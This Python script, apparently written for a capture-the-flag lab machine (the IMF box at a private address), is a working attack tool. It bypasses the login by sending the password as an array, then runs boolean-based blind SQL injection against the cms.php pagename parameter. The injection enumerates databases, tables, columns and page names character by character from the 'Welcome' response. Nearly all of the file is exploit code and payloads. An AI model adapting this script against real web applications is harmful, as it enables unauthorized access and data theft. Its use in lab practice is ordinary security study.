from pwn import *
import requests
import signal
import time
import sys
import string


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


# ctrl + c
signal.signal(signal.SIGINT, def_handler)


# Global variables
URL = "http://192.168.1.81/imfadministrator/"
VULNERABLE_URL = URL + "cms.php?pagename=home"
CHARS = string.ascii_lowercase + string.digits + "_-"


def enum_pagename_column(cookies):
    rows = ""
    p1 = log.progress("[admin][pages][pagename] Data")
    time.sleep(2)

    for row in range(4):
        data = ""
        for position_character in range(30):
            if len(data)+1 < position_character:
                rows += data + ", "
                break

            for char in CHARS:
                payload = f"""
                    ' AND ( 
                    SELECT SUBSTRING(pagename,{position_character},1) 
                    FROM pages 
                    limit {row},1
                    ) = '{char}
                """

                payload = payload.replace('\n', '')
                r = requests.get(VULNERABLE_URL + payload, cookies=cookies)

                if "Welcome to the IMF Administration." in r.text:
                    data += char
                    p1.status(rows + data)
                    break
    p1.success(rows)
    time.sleep(1)
    return


def get_columns_names(cookies, columns):
    columns_names = ""
    p1 = log.progress("[admin][pages] Columns")
    time.sleep(2)

    for column in range(columns):

        data = ""
        for position_character in range(30):
            if len(data)+1 < position_character:
                columns_names += data + ", "
                break

            for char in CHARS:
                payload = f"""
                    ' AND ( 
                    SELECT SUBSTRING(column_name,{position_character},1) 
                    FROM information_schema.columns
                    WHERE table_schema = 'admin'
                    AND table_name = 'pages'
                    limit {column},1
                    ) = '{char}
                """

                payload = payload.replace('\n', '')
                r = requests.get(VULNERABLE_URL + payload, cookies=cookies)

                if "Welcome to the IMF Administration." in r.text:
                    data += char
                    p1.status(columns_names + data)
                    break
    p1.success(columns_names)
    time.sleep(1)
    return


def get_columns(cookies):
    p1 = log.progress("[admin][pages] Columns")
    time.sleep(2)

    for columns in range(20):
        payload = f"""
            ' AND ( 
            SELECT COUNT(column_name) 
            FROM information_schema.columns
            WHERE table_name = 'pages'
            ) = '{columns}
        """

        payload = payload.replace('\n', '')
        r = requests.get(VULNERABLE_URL + payload, cookies=cookies)

        if "Welcome to the IMF Administration." in r.text:
            break
    p1.success(str(columns) + " available")
    time.sleep(1)
    return columns


def get_tables_names(cookies, tables):
    tables_names = ""
    p1 = log.progress("[admin] Tables")
    time.sleep(2)

    for table in range(tables):
        data = ""
        for position_character in range(30):
            if len(data)+1 < position_character:
                tables_names += data + ", "
                break
            for char in CHARS:
                payload = f"""
                    ' AND ( 
                    SELECT SUBSTRING(table_name, {position_character}, 1) 
                    FROM information_schema.tables
                    WHERE table_schema='admin'
                    LIMIT {table},1 
                    ) = '{char}
                """

                payload = payload.replace('\n', '')
                r = requests.get(VULNERABLE_URL + payload, cookies=cookies)

                if "Welcome to the IMF Administration." in r.text:
                    data += char
                    p1.status(tables_names + data)
                    break
    p1.success(tables_names)
    time.sleep(1)
    return


def get_tables(cookies):
    tables = ""
    p1 = log.progress("[admin] Tables")
    time.sleep(2)

    for tables in range(20):
        payload = f"""
            ' AND ( 
            SELECT COUNT(table_name) 
            FROM information_schema.tables
            WHERE table_schema = 'admin'
            ) = '{tables}
        """

        payload = payload.replace('\n', '')
        r = requests.get(VULNERABLE_URL + payload, cookies=cookies)
        if "Welcome to the IMF Administration." in r.text:
            break
    p1.success(str(tables) + " available")
    time.sleep(1)
    return tables


def get_dbs_names(cookies, dbs):
    databases = ""
    p1 = log.progress("Databases")
    time.sleep(2)

    for i in range(dbs):
        data = ""
        for position_character in range(30):
            if len(data)+1 < position_character:
                databases += data + ", "
                break
            for char in CHARS:
                payload = f"""
                    ' AND ( 
                    SELECT SUBSTRING(schema_name, {position_character}, 1) 
                    FROM information_schema.schemata 
                    LIMIT {i},1 
                    ) = '{char}
                """

                payload = payload.replace('\n', '')
                r = requests.get(VULNERABLE_URL + payload, cookies=cookies)

                if "Welcome to the IMF Administration." in r.text:
                    data += char
                    p1.status(databases + data)
                    break
    p1.success(databases)
    time.sleep(1)
    return


def get_dbs(cookies):
    p1 = log.progress("Databases")
    time.sleep(2)

    for dbs in range(10):
        payload = f"""
            ' AND ( 
            SELECT COUNT(schema_name) 
            FROM information_schema.schemata 
            ) = '{dbs}
        """

        payload = payload.replace('\n', '')
        r = requests.get(VULNERABLE_URL + payload, cookies=cookies)
        if "Welcome to the IMF Administration." in r.text:
            break
    p1.success(str(dbs) + " available")
    time.sleep(1)
    return dbs


def get_session():
    data = {
        "user": "rmichaels",
        "pass[]": "123"
    }
    r = requests.post(URL, data=data)
    cookies = r.cookies
    return cookies


def main():
    cookies = get_session()

    dbs = get_dbs(cookies)
    get_dbs_names(cookies, dbs)
    print()

    tables = get_tables(cookies)
    get_tables_names(cookies, tables)
    print()

    columns = get_columns(cookies)
    get_columns_names(cookies, columns)
    print()

    enum_pagename_column(cookies)
    return


if __name__ == '__main__':
    main()
